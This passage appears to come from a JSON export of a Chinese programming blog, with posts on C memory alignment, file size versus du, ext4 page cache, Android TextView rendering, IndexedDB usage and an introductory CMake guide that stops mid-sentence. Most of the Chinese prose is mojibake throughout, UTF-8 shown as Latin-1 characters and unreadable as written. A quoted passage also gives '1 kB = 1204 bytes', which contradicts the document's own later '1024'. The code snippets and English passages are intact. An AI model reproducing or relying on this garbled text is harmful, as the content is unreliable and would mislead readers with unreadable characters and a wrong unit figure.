ï¼šå„ä¸ªç¡¬ä»¶å¹³å°å¯¹å­˜å‚¨ç©ºé—´çš„å¤„ç†ä¸Šæœ‰å¾ˆå¤§çš„ä¸åŒã€‚ä¸€äº›å¹³å°å¯¹æŸäº›ç‰¹å®šç±»å‹çš„æ•°æ®åªèƒ½ä»æŸäº›ç‰¹å®šåœ°å€å¼€å§‹å­˜å–ã€‚å…¶ä»–å¹³å°å¯èƒ½æ²¡æœ‰è¿™ç§æƒ…å†µï¼Œä½†æ˜¯æœ€å¸¸è§çš„æ˜¯å¦‚æœä¸æŒ‰ç…§é€‚åˆå…¶å¹³å°çš„è¦æ±‚å¯¹æ•°æ®å­˜æ”¾è¿›è¡Œå¯¹é½ï¼Œä¼šåœ¨å­˜å–æ•ˆç‡ä¸Šå¸¦æ¥æŸå¤±ã€‚æ¯”å¦‚æœ‰äº›å¹³å°æ¯æ¬¡è¯»éƒ½æ˜¯ä»å¶åœ°å€å¼€å§‹ï¼Œå¦‚æœä¸€ä¸ª int å‹ï¼ˆå‡è®¾ä¸º32ä½ï¼‰å¦‚æœå­˜æ”¾åœ¨å¶åœ°å€å¼€å§‹çš„åœ°æ–¹ï¼Œé‚£ä¹ˆä¸€ä¸ªè¯»å‘¨æœŸå°±å¯ä»¥è¯»å‡ºï¼Œè€Œå¦‚æœå­˜æ”¾åœ¨å¥‡åœ°å€å¼€å§‹çš„åœ°æ–¹ï¼Œå°±å¯èƒ½ä¼šéœ€è¦ 2 ä¸ªè¯»å‘¨æœŸï¼Œå¹¶å¯¹ä¸¤æ¬¡è¯»å‡ºçš„ç»“æœçš„é«˜ä½å­—èŠ‚è¿›è¡Œæ‹¼å‡‘æ‰èƒ½å¾—åˆ°è¯¥ int æ•°æ®ã€‚æ˜¾ç„¶åœ¨è¯»å–æ•ˆç‡ä¸Šä¸‹é™å¾ˆå¤šï¼Œè¿™ä¹Ÿæ˜¯ç©ºé—´å’Œæ—¶é—´çš„åšå¼ˆã€‚â€œå†…å­˜å¯¹é½â€åº”è¯¥æ˜¯ç¼–è¯‘å™¨çš„â€œç®¡è¾–èŒƒå›´â€ã€‚ç¼–è¯‘å™¨ä¸ºç¨‹åºä¸­çš„æ¯ä¸ªâ€œæ•°æ®å•å…ƒâ€å®‰æ’åœ¨é€‚å½“çš„ä½ç½®ä¸Šã€‚ä½†æ˜¯Cè¯­è¨€çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯å¤ªçµæ´»ï¼Œå¤ªå¼ºå¤§ï¼Œå®ƒå…è®¸ä½ å¹²é¢„â€œå†…å­˜å¯¹é½â€ å¯¹é½è§„åˆ™(å†…å­˜ç›¸å…³)æ¯ä¸ªç‰¹å®šå¹³å°ä¸Šçš„ç¼–è¯‘å™¨éƒ½æœ‰è‡ªå·±é»˜è®¤çš„â€œå¯¹é½ç³»æ•°â€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é¢„å¤„ç†æŒ‡ä»¤#pragma pack(n), n=1, 2, 4, 8, 16â€¦æ¥æ”¹å˜è¿™ä¸€ç³»æ•°ï¼Œè¿™ä¸ª n å°±æ˜¯å¯¹é½ç³»æ•° æ•°æ®æˆå‘˜å¯¹é½è§„åˆ™ï¼šç»“æ„(struct)æˆ–è”åˆ(union)çš„æ•°æ®æˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æˆå‘˜æ”¾åœ¨ offset ä¸º 0 çš„åœ°æ–¹ï¼Œä»¥åçš„æ¯ä¸ªæ•°æ®æˆå‘˜çš„å¯¹é½æŒ‰ç…§#pragma pack(n)æŒ‡å®šçš„ n å€¼å’Œè¯¥æ•°æ®æˆå‘˜æœ¬èº«çš„é•¿åº¦ len = sizeof(type) ä¸­ï¼Œè¾ƒå°çš„é‚£ä¸ªè¿›è¡Œï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºæŒ‡å®šnå€¼ï¼Œåˆ™ä»¥lenä¸ºå‡†ï¼Œè¿›è¡Œå¯¹é½ç»“æ„/è”åˆæ•´ä½“å¯¹é½è§„åˆ™ï¼šåœ¨æ•°æ®æˆå‘˜å¯¹é½å®Œæˆä¹‹åï¼Œç»“æ„/è”åˆæœ¬èº«ä¹Ÿè¦å¯¹é½ï¼Œå¯¹é½æŒ‰ç…§#pragma pack(n)æŒ‡å®šçš„nå€¼å’Œè¯¥ç»“æ„/è”åˆæœ€å¤§æ•°æ®æˆå‘˜é•¿åº¦max_len_of_membersä¸­ï¼Œè¾ƒå°çš„é‚£ä¸ªè¿›è¡Œï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºæŒ‡å®šnå€¼ï¼Œåˆ™ä»¥max_len_of_membersä¸ºå‡†ï¼Œè¿›è¡Œå¯¹é½ç»“åˆ1ã€2å¯æ¨æ–­ï¼šå½“nå€¼å‡è¶…è¿‡(æˆ–ç­‰äº)æ‰€æœ‰æ•°æ®æˆå‘˜çš„é•¿åº¦æ—¶ï¼Œè¿™ä¸ªnå€¼çš„å¤§å°å°†ä¸äº§ç”Ÿä»»ä½•æ•ˆæœ ä»fsizeçœ‹block#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define N 1024 long fsize(FILE *fp){ fseek(fp, 0, SEEK_END); return ftell(fp); } int main(){ printf(&quot;enter the file absolute path: \\n &quot;); char str[N]; scanf(&quot;%s&quot;,str); printf(&quot;\\n the file name you choose is: %s\\n &quot;,str); FILE *fp = fopen(str, &quot;rb&quot;); if(fp == NULL ){ printf(&quot;error opening file \\n&quot;); exit(-1); } printf(&quot;len: %ld bytes\\n&quot;, fsize(fp)); fclose(fp); return 0; } ç®€å•çš„ä¸€ä¸ªç”¨fsizeå‡½æ•°è·å–æ–‡ä»¶çš„bytesæ•°çš„å‡½æ•° ./a.out sample.txt ## len: 2527 bytesdu sample.txt4 sample.txtdu -b sample.txt2527 sample.txt ç®€å•çš„æ¥è¯´ï¼Œfsizeè·å–çš„å¤§å°å’Œduçš„ç»“æœä¸ä¸€è‡´ã€‚ä½†du -b å°±ä¸€æ ·äº†ã€‚è¿™äº‹ä¸»è¦æ˜¯å› ä¸ºblock sizeçš„ç¼˜æ•…,æ–‡ä»¶ç³»ç»Ÿåˆ†é…ç£ç›˜å­˜å‚¨çš„æ—¶å€™æ˜¯ä»¥blockä¸ºå•ä½çš„ã€‚æ‰€ä»¥ç»å¸¸çœ‹åˆ°windowsé‡Œé¢æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„å¤§å°å’Œâ€œå ç”¨çš„ç£ç›˜ç©ºé—´â€ã€‚å°±æ˜¯å› ä¸ºblockçš„åŸå› ã€‚æ›´è¯¦ç»†çš„è§£é‡Šåœ¨è¿™é‡Œ For files, ls -l file shows (among other things) the size of file in bytes, while du -k file shows the space occupied by file on disk (in units of 1 kB = 1204 bytes). Since disk space is allocated in blocks, the size indicated by du -k is always slightly larger than the space indicated by ls -kl (which is the same as ls -l, but in 1 kB units). For directories, ls -ld dir shows (among other things) the size of the list of filenames (together with a number of attributes) of the files and subdirectories in dir. This is just the list of filenames, not the filesâ€™ or subdirectoriesâ€™ contents. So this size increases when you add files to dir (even when files are empty), but it stays unchanged when one of the files in dir grows. However, when you delete files from dir the space from the list is not reclaimed immediately, but rather the entries for deleted files are marked as unused, and are later recycled (this is actually implementation-dependent, but what I described is pretty much the universal behavior these days). Thatâ€™s why you may not see any changes in ls -ld output when you delete files until much later, if ever. Finally, du -ks dir shows (an estimate of) the space occupied on disk by all files in dir, together with all files in all of dirâ€™s subdirectories, in 1 kB = 1024 bytes units. Taking into account the description above, this has no relation whatsoever with the output of ls -kld dir. linuxä¸Šæ˜¯ext4æ–‡ä»¶ç³»ç»Ÿåº”ç”¨ç¨‹åºè°ƒç”¨read()æ–¹æ³•ï¼Œç³»ç»Ÿä¼šé€šè¿‡ä¸­æ–­ä»ç”¨æˆ·ç©ºé—´è¿›å…¥å†…æ ¸å¤„ç†æµç¨‹ï¼Œç„¶åç»è¿‡VFS(Virtual File Systemï¼Œè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ)ã€å…·ä½“æ–‡ä»¶ç³»ç»Ÿã€é¡µç¼“å­˜Page Cacheã€‚VFSä¸»è¦æ˜¯ç”¨äºå®ç°å±è”½å…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºåº”ç”¨ç¨‹åºçš„æ“ä½œæä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ã€‚Page Cache(é¡µç¼“å­˜)ï¼Œè¯»æ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå…ˆçœ‹ä¸€ä¸‹å®ƒæ˜¯ä¸æ˜¯å·²ç»åœ¨Page Cacheé‡Œé¢ï¼Œå¦‚æœå‘½ä¸­äº†çš„è¯ï¼Œå°±ä¸ä¼šå»è¯»å–ç£ç›˜ã€‚é€šè¿‡/proc/meminfoæ–‡ä»¶å¯ä»¥æŸ¥çœ‹ç¼“å­˜çš„å†…å­˜å ç”¨æƒ…å†µï¼Œå½“ç³»ç»Ÿå†…å­˜ä¸è¶³çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå›æ”¶è¿™éƒ¨åˆ†å†…å­˜ï¼ŒI/Oçš„æ€§èƒ½å°±ä¼šé™ä½ã€‚ è¿™æœ¬åº”è¯¥æ˜¯ä¸€ç¯‡å…³äºæ“ä½œç³»ç»ŸåŸç†ï¼Œå†…æ ¸ç®€ä»‹çš„æ–‡ç« ,to be complemented å‚è€ƒ [ ] Paging Technique : Memory management in Operating System æ·±å…¥ç†è§£ ext4 ç­‰ Linux æ–‡ä»¶ç³»ç»Ÿ Linux çš„ EXT4 æ–‡ä»¶ç³»ç»Ÿçš„å†å²ã€ç‰¹æ€§ä»¥åŠæœ€ä½³å®è·µ https://zhuanlan.zhihu.com/p/52054044https://zhuanlan.zhihu.com/p/35879028 http://docs.linuxtone.org/ebooks/C&amp;CPP/c/ch20s05.html è™šæ‹Ÿå†…å­˜ï¼Œåˆ†é¡µwhat a c programmer should know about memorymmapé¿å…æ‹·è´æ˜¯å› ä¸ºåŒæ ·çš„å†…å®¹åœ¨ç‰©ç†å†…å­˜ä¸­åªæœ‰ä¸€ä»½RocketMQ MappedFile é¢„çƒ­åŸç†è§£æ","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"TextViewæµ‹é‡åŠæ¸²æŸ“åŸç†","date":"2018-11-29T16:11:54.000Z","path":"2018/11/29/2018-11-29-how-is-text-drawn-on-android/","text":"Androidä¸Šçš„TextViewåˆ†ä¸ºjavaå±‚å’Œnativeå±‚ï¼Œjavaå±‚åŒ…æ‹¬Layout,Paint,Canvasnativeå±‚åŒ…æ‹¬å„ç§å¼€æºåº“ï¼ŒMinikin,ICU,HarfBuzz,FreeTypeå…³äºæ–‡å­—çš„å½¢ä½“,æ’ç‰ˆç­‰ä¿¡æ¯æ˜¯nativeå±‚è®¡ç®—å‡ºæ¥çš„ã€‚ [tbd] TextViewæ˜¯ä¸€ä¸ªå¾ˆé‡çš„æ§ä»¶ï¼Œç”±äºmeasureè€—æ—¶é€šå¸¸å¾ˆå¤šï¼ŒAndroid Pæå‡ºäº†Precomputed Textçš„æ¦‚å¿µã€‚ç±»ä¼¼çš„æ¦‚å¿µæ—©å‡ å¹´instagramä¹Ÿæå‡ºè¿‡ï¼ˆå¦‚æœåªæ˜¯æƒ³è¦å±•ç¤ºä¸€æ®µæ–‡å­—ï¼Œåœ¨ä¸€ä¸ªå­çº¿ç¨‹ç”¨Layoutå»è®¡ç®—ã€‚æˆ‘ç¢°åˆ°çš„æƒ…å†µæ˜¯ï¼šlayout.getDesiredwidth(â€œä¸€ä¸ªå­—â€) &gt; layout.getDesiredwidth(â€œä¸€â€) + layout.getDesiredwidth(â€œä¸ªâ€)+ layout.getDesiredwidth(â€œå­—â€)ã€‚å¤šæ•°æƒ…å†µä¸‹ï¼Œå·¦è¾¹çš„å€¼å’Œå³è¾¹çš„widthä¹‹å’Œæ˜¯ç›¸ç­‰çš„ï¼Œä½†æ˜¯å‡ºç°ä¸­è‹±æ–‡å¤¹æ‚çš„æ—¶å€™å·¦è¾¹ä¼šå°äºå³è¾¹ã€‚ä¸æ¸…æ¥šè¿™æ˜¯å¦æ˜¯æå‰æ¢è¡Œçš„åŸå› ã€‚ Layoutæœ‰BoringLayout(ä¸€è¡Œæ–‡å­—),StaticLayout(å¤šè¡Œæ–‡å­—)å’ŒDynamicLayout(æ–‡å­—ä¼šå˜)è¿™ä¸‰ä¸ªå­ç±» åœ¨æŸäº›ç‰ˆæœ¬çš„Androidä¸Šï¼ŒTextViewç¢°åˆ°ä¸­è‹±æ–‡å¤¹æ‚çš„æ—¶å€™ï¼Œä¼šå‡ºç°æå‰æ¢è¡Œ(æ™®éçš„çœ‹æ³•æ˜¯Layoutè¿™ä¸ªç±»é‡Œé¢å¤„ç†å…¨è§’ç¬¦å·çš„æ—¶å€™ç®—é”™äº†) ActivityThreadé‡Œé¢æœ‰ä¸€ä¸ªfreeTextLayoutCachesIfNeededæ–¹æ³• static void freeTextLayoutCachesIfNeeded(int configDiff) { if (configDiff != 0) { // Ask text layout engine to free its caches if there is a locale change boolean hasLocaleConfigChange = ((configDiff &amp; ActivityInfo.CONFIG_LOCALE) != 0); if (hasLocaleConfigChange) { Canvas.freeTextLayoutCaches(); if (DEBUG_CONFIGURATION) Slog.v(TAG, &quot;Cleared TextLayout Caches&quot;); } } } å‚è€ƒTextviewçš„é«˜åº¦ascent,descentè¿™äº›çš„è¯¦ç»†è§£è¯´TextViewé¢„æ¸²æŸ“ç ”ç©¶instagramçš„æ–‡ç« Best practices for text on Android (Google I/O â€˜18)Use Android Text Like a Pro (Android Dev Summit â€˜18)","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"æµè§ˆå™¨indexedDbä½¿ç”¨ç¤ºä¾‹","date":"2018-11-27T10:33:01.000Z","path":"2018/11/27/2018-11-27-indexed-db-tutorial/","text":"æµè§ˆå™¨indexedDbä½¿ç”¨æ–¹å¼åŠæ³¨æ„çš„ç‚¹ æµè§ˆå™¨ä¸Šå¯ä¾›ä½¿ç”¨çš„æ•°æ®æŒä¹…åŒ–é€‰æ‹©å°±è¿™äº› 1) Store all data on server database (SQL or NoSQL)2) LocalStorage / SessionStorage - limited memory (around 5MB)3) WebSQL - it has been deprecated in favor of IndexedDB4) IndexedDB - designed as â€œone trueâ€ browser database with 50MB and moretl;dr Use some library from conclusion section to make your life easier. ä¸€äº›é‡è¦çš„æ¦‚å¿µDatabase(é€šå¸¸ä¸€ä¸ªappåªæœ‰ä¸€ä¸ªdatabase)127.0.0.1:8080å’Œ127.0.0.1ï¼š8000 æ˜¯ä¸¤ä¸ªä¸åŒçš„Applicationåˆ›å»ºå‡ºæ¥çš„æ•°æ®åº“åœ¨Application-&gt;Storage-&gt;IndexedDBé‡Œé¢æœ‰ Object Stores(å°±åƒæ•°æ®åº“é‡Œçš„tableæˆ–è€…collectionsä¸€æ ·ï¼Œä½†æ˜¯åŒä¸€ä¸ªstoreä¸­å­˜å‚¨çš„æ•°æ®ç±»å‹ä¸ä¸€å®šæ˜¯ç›¸åŒçš„) transactionï¼ˆæ‰€æœ‰å¯¹IndexDbçš„æ“ä½œå¿…é¡»é€šè¿‡transactionï¼‰ æ¥ä¸‹æ¥æ˜¯CURDçš„å®ä¾‹ db.openè¿”å›çš„æ˜¯ä¸€ä¸ªIDBRequestå¯¹è±¡ï¼Œæ²¡æœ‰promiseçš„æ–¹å¼æ˜¯è¿™æ ·ä½¿ç”¨çš„ var db; // Let us open our database var DBOpenRequest = window.indexedDB.open(&quot;toDoList&quot;, 4); // these two event handlers act on the database being // opened successfully, or not DBOpenRequest.onerror = function(event) { note.innerHTML += &#39;&lt;li&gt;Error loading database.&lt;/li&gt;&#39;; }; DBOpenRequest.onsuccess = function(event) { note.innerHTML += &#39;&lt;li&gt;Database initialised.&lt;/li&gt;&#39;; // store the result of opening the database. db = DBOpenRequest.result; }; (Create)åˆ›å»ºdbçš„ä»£ç :indexedDB.open(â€˜db-nameâ€™, 1) //ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°æ®åº“ç‰ˆæœ¬ æ·»åŠ æ•°æ®çš„æ–¹å¼function putSomeData() { let indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB let open = indexedDB.open(&#39;db-name&#39;, 1) open.onupgradeneeded = function() { let db = open.result db.createObjectStore(&#39;objectStoreName&#39;, { autoIncrement: true }) } open.onsuccess = function() { let db = open.result let tx = db.transaction(&#39;objectStoreName&#39;, &#39;readwrite&#39;) let store = tx.objectStore(&#39;objectStoreName&#39;) store.put({ firstname: &#39;John&#39;, lastname: &#39;Doe&#39;, age: 33 }) tx.oncomplete = function() { db.close() } } } çœŸå•°å—¦ï¼Œè¿˜æ˜¯ç”¨ç¬¬ä¸‰æ–¹åº“å§ï¼Œç”¨idbå¥½äº† async function putSomeData() { let db = await idb.open(&#39;db-name&#39;, 1, upgradeDB =&gt; upgradeDB.createObjectStore(&#39;objectStoreName&#39;, { autoIncrement: true })) let tx = db.transaction(&#39;objectStoreName&#39;, &#39;readwrite&#39;) let store = tx.objectStore(&#39;objectStoreName&#39;) await store.put({ firstname: &#39;John&#39;, lastname: &#39;Doe&#39;, age: 33 }) await tx.complete db.close() } async function getAllData() { let db = await idb.open(&#39;db-name&#39;, 1) let tx = db.transaction(&#39;objectStoreName&#39;, &#39;readonly&#39;) let store = tx.objectStore(&#39;objectStoreName&#39;) // add, clear, count, delete, get, getAll, getAllKeys, getKey, put let allSavedItems = await store.getAll() console.log(allSavedItems) db.close() } æ‰¯ä¸€ç‚¹å…³äºå­˜å‚¨çš„ä¸œè¥¿å½“æµè§ˆå™¨è¿›å…¥ç§äººæ¨¡å¼(private browsing modeï¼ŒGoogle Chrome ä¸Šå¯¹åº”çš„åº”è¯¥æ˜¯å«éšèº«æ¨¡å¼)çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ã€ä¸´æ—¶çš„ã€ç©ºçš„æ•°æ®åº“ï¼Œç”¨ä»¥å­˜å‚¨æœ¬åœ°æ•°æ®(local storage data)ã€‚å½“æµè§ˆå™¨å…³é—­æ—¶ï¼Œé‡Œé¢çš„æ‰€æœ‰æ•°æ®éƒ½å°†è¢«ä¸¢å¼ƒã€‚ åˆ¤æ–­æ–¹å¼ //éšèº«æ¨¡å¼ä¸‹å’ŒlocalStorageæ»¡äº†éƒ½ä¼šæŠ¥åŒæ ·çš„é”™è¯¯ try { window.localStorage.setItem(&#39;test&#39;, &#39;test&#39;) } catch (e) { console.log(e) //QuotaExceddedError(DOM Exception 22):The quota has been exceeded. }","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"},{"name":"javaScript","slug":"javaScript","permalink":"https://haldir65.github.io/tags/javaScript/"}]},{"title":"cmakeå®ç”¨æ‰‹å†Œ","date":"2018-11-26T13:42:16.000Z","path":"2018/11/26/2018-11-26-cmake-intro/","text":"CMakeLists.txtè¿™ä¸ªæ–‡ä»¶çš„å†™æ³•ä»¥åŠcmakeè¿™ä¸ªexecutableçš„å‚æ•° CMakeå¥½åœ¨è·¨å¹³å° ä½ æˆ–è®¸å¬è¿‡å¥½å‡ ç§ Make å·¥å…·ï¼Œä¾‹å¦‚ GNU Make ï¼ŒQT çš„ qmake ï¼Œå¾®è½¯çš„ MS nmakeï¼ŒBSD Makeï¼ˆpmakeï¼‰ï¼ŒMakeppï¼Œç­‰ç­‰ã€‚è¿™äº› Make å·¥å…·éµå¾ªç€ä¸åŒçš„è§„èŒƒå’Œæ ‡å‡†ï¼Œæ‰€æ‰§è¡Œçš„ Makefile æ ¼å¼ä¹Ÿåƒå·®ä¸‡åˆ«ã€‚è¿™æ ·å°±å¸¦æ¥äº†ä¸€ä¸ªä¸¥å³»çš„é—®é¢˜ï¼šå¦‚æœè½¯ä»¶æƒ³è·¨å¹³å°ï¼Œå¿…é¡»è¦ä¿è¯èƒ½å¤Ÿåœ¨ä¸åŒå¹³å°ç¼–è¯‘ã€‚è€Œå¦‚æœä½¿ç”¨ä¸Šé¢çš„ Make å·¥å…·ï¼Œå°±å¾—ä¸ºæ¯ä¸€ç§æ ‡å‡†å†™ä¸€æ¬¡ Makefile ï¼Œè¿™å°†æ˜¯ä¸€ä»¶è®©äººæŠ“ç‹‚çš„å·¥ä½œã€‚å°±æ˜¯é’ˆå¯¹ä¸Šé¢é—®é¢˜æ‰€è®¾è®¡çš„å·¥å…·ï¼šå®ƒé¦–å…ˆå…è®¸å¼€å‘è€…ç¼–å†™ä¸€ç§å¹³å°æ— å…³çš„ CMakeList.txt æ–‡ä»¶æ¥å®šåˆ¶æ•´ä¸ªç¼–è¯‘æµç¨‹ï¼Œç„¶åå†æ ¹æ®ç›®æ ‡ç”¨æˆ·çš„å¹³å°è¿›ä¸€æ­¥ç”Ÿæˆæ‰€éœ€çš„æœ¬åœ°åŒ– Makefile å’Œå·¥ç¨‹æ–‡ä»¶ï¼Œå¦‚ Unix çš„ Makefile æˆ– Windows çš„ Visual Studio å·¥ç¨‹ã€‚ä»è€Œåšåˆ°â€œWrite once, run everywhereâ€ã€‚ ä¸‹é¢å°±æ˜¯æœ€ç®€å•çš„ä¸€ä¸ªCMakeLists.txtçš„ä¾‹å­ï¼Œproject(app_project)æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°ç”Ÿæˆäº†PROJECT_NAMEè¿™ä¸ªå˜é‡ï¼Œæ‰€ä»¥ä¸‹é¢ç›´æ¥ç”¨äº†ã€‚add_executableï¼ˆï¼‰ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°(å…¶å®å¯ä»¥åŒ…æ‹¬æ‰€æœ‰ç¼–è¯‘éœ€è¦çš„æºæ–‡ä»¶) ä¸€ä¸ªç®€å•çš„CMakeLists.txtå¦‚ä¸‹ cmake_minimum_required(VERSION 3.5) project(app_project) add_executable(myapp main.c) install(TARGETS myapp DESTINATION bin) å…¶å®å°±å¯ä»¥æ‹¿æ¥ç”¨äº†ï¼Œå…ˆä¸è¦æ€¥ç€æ•²cmake mkdir _build &amp;&amp; cd _build &amp;&amp; cmake .. -DCMAKE_INSTALL_PREFIX=../_install make &amp;&amp; make installï¼ˆinstallå…¶å®å°±æ˜¯æŠŠå¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°/usr/biné‡Œé¢ï¼Œæˆ–è€…æŠŠ.soæ–‡ä»¶å¤åˆ¶åˆ°/usr/libé‡Œï¼Œæˆ–è€…æŠŠ/usr/includeé‡Œé¢ï¼‰ ä¹‹æ‰€ä»¥æ²¡æœ‰ç›´æ¥åœ¨å½“å‰ç›®å½•ä¸‹æ•²cmakeçš„åŸå› æ˜¯ï¼Œcmakeä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€å¤§å †ä¸­é—´äº§ç‰©ï¼Œè¿˜ä¸å¦‚æŒªåˆ°ä¸€ä¸ªä¸“é—¨çš„ç›®å½•ä¸‹ã€‚æ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯æ¨èè‡ªå·±å»ºä¸€ä¸ªbuildæ–‡ä»¶å¤¹ï¼Œé¿å…å¼„ä¹±è‡ªå·±çš„source treeDCMAKE_INSTALL_PREFIXè¿™ä¸ªå˜é‡ç”¨äºæŒ‡å®šinstallå¤åˆ¶çš„ç›®çš„åœ°ï¼Œå¦åˆ™ä¼šæŠŠç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°/usr/binè¿™äº›ç›®å½•é‡Œ cmakeæ”¯æŒIn-Place Buildå’ŒOut-of-Source Buildã€‚å‰è€…æ˜¯ç›´æ¥åœ¨å½“å‰æ–‡ä»¶å¤¹ï¼ˆCMAKE_BINARY_DIRï¼‰ä¸­ç”Ÿæˆä¸€å¤§å †æ–‡ä»¶ï¼ˆå¤ªä¹±äº†ï¼‰ï¼Œåè€…åˆ™æ˜¯åœ¨ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆæ–‡ä»¶ã€‚ (æˆ‘è§‰å¾—è¿™ä¸€æ®µçŸ¥é“æœ‰è¿™ä¹ˆå›äº‹å°±è¡Œäº†)Out-of-source buildå…¶å®å¾ˆç®€å•mkdir build &amp;&amp; cd build/ &amp;&amp; cmake .. (åœ¨buildæ–‡ä»¶å¤¹ä¸­ä¼šç”Ÿæˆä¸€ä¸ªMakefile)make &amp;&amp; ./hello_cmake CMakeLists.txtæ–‡ä»¶ä¹Ÿæ”¯æŒè®¾ç½®ä¸å…è®¸IN_SOURCE_BUILDset(CMAKE_DISABLE_IN_SOURCE_BUILD ON) cmake â€“helpä¸€ç±»çš„ä¸œè¥¿å§$ cmake -H. -Bbuild $ cmake CMakeLists.txt //æŒ‡å®šæ–‡ä»¶ä½ç½® # H indicates source directory # B indicates build directory CMakeLists.txté‡Œé¢ä¸€å †å†…ç½®çš„å˜é‡ä¾›å‚è€ƒ Variable Info CMAKE_SOURCE_DIR The root source directory CMAKE_CURRENT_SOURCE_DIR The current source directory if using sub-projects and directories. PROJECT_SOURCE_DIR The source directory of the current cmake project. CMAKE_BINARY_DIR The root binary / build directory. This is the directory where you ran the cmake command. CMAKE_CURRENT_BINARY_DIR The build directory you are currently in. PROJECT_BINARY_DIR The build directory for the current project. CMAKE_LIBRARY_OUTPUT_DIRECTORY ç”Ÿæˆçš„.dllæˆ–è€….soæ–‡ä»¶çš„ç›®å½• LIBRARY_OUTPUT_PATH ç”Ÿæˆçš„.dllæˆ–è€….soæ–‡ä»¶çš„è·¯å¾„ CMAKE_ARCHIVE_OUTPUT_DIRECTORY ç”Ÿæˆçš„.aæˆ–è€….libæ–‡ä»¶çš„ç›®å½• ARCHIVE_OUTPUT_PATH ç”Ÿæˆçš„.aæˆ–è€….libæ–‡ä»¶çš„è·¯å¾„ è¿˜æœ‰ä¸€å †å‡½æ•°ï¼Œæ¯”å¦‚strcmpè¿™ç§,if elseä¹Ÿæ˜¯å¯ä»¥å†™çš„è¿™ç§è‡ªå·±æŸ¥ä¸€ä¸‹å°±è¡Œäº† å†…ç½®çš„ä¸€äº›å˜é‡ç»“åˆå‡½æ•°èƒ½å¤Ÿå¸®åŠ©åˆ¤æ–­å½“å‰è¿è¡Œåœ¨å“ªç§ç³»ç»Ÿä¸­cmake_minimum_required(VERSION 3.9.1) project(CMakeHello) set(CMAKE_CXX_STANDARD 14) # UNIX, WIN32, WINRT, CYGWIN, APPLE are environment variables as flags set by default system if(UNIX) message(&quot;This is a ${CMAKE_SYSTEM_NAME} system&quot;) elseif(WIN32) message(&quot;This is a Windows System&quot;) endif() # or use MATCHES to see if actual system name # Darwin is Apple&#39;s system name if(${CMAKE_SYSTEM_NAME} MATCHES Darwin) message(&quot;This is a ${CMAKE_SYSTEM_NAME} system&quot;) elseif(${CMAKE_SYSTEM_NAME} MATCHES Windows) message(&quot;This is a Windows System&quot;) endif() add_executable(cmake_hello main.cpp) è¿˜å¯ä»¥åœ¨cmakeä¸­å®šä¹‰å˜é‡ï¼Œåœ¨c++ä»£ç ä¸­å¼•ç”¨CMakeLists.txt cmake_minimum_required(VERSION 3.9.1) project(CMakeHello) set(CMAKE_CXX_STANDARD 14) # or use MATCHES to see if actual system name # Darwin is Apple&#39;s system name if(${CMAKE_SYSTEM_NAME} MATCHES Darwin) add_definitions(-DCMAKEMACROSAMPLE=&quot;Apple MacOS&quot;) elseif(${CMAKE_SYSTEM_NAME} MATCHES Windows) add_definitions(-DCMAKEMACROSAMPLE=&quot;Windows PC&quot;) endif() add_executable(cmake_hello main.cpp) #include &lt;iostream&gt; #ifndef CMAKEMACROSAMPLE #define CMAKEMACROSAMPLE &quot;NO SYSTEM NAME&quot; #endif auto sum(int a, int b){ return a + b; } int main() { std::cout&lt;&lt;&quot;Hello CMake!&quot;&lt;&lt;std::endl; std::cout&lt;&lt;CMAKEMACROSAMPLE&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Sum of 3 + 4 :&quot;&lt;&lt;sum(3, 4)&lt;&lt;std::endl; return 0; } headeræ–‡ä»¶çš„å¤„ç†å¯ä»¥æŒ‡å®šå¤šä¸ªæºæ–‡ä»¶ set(SOURCES src/Hello.cpp src/main.cpp)add_executable(${PROJECT_NAME} ${SOURCES})//æˆ–è€…ç›´æ¥æŠŠsrcæ–‡ä»¶å¤¹ä¸‹é¢çš„æ‰€æœ‰.cppæ–‡ä»¶åŠ å…¥è¿›æ¥file(GLOB SOURCES â€œsrc/*.cppâ€) å¯¹äºincludeæ–‡ä»¶å¤¹ target_include_directories(target PRIVATE ${PROJECT_SOURCE_DIR}/include)è¿™æ ·ç¼–è¯‘å™¨å°±ä¼šåœ¨ç¼–è¯‘å‚æ•°ä¸ŠåŠ ä¸Š-I/directory/pathè¿™ç§ä¸œè¥¿ include_directorieså’Œadd_subdirectoryçš„åŒºåˆ«åœ¨include 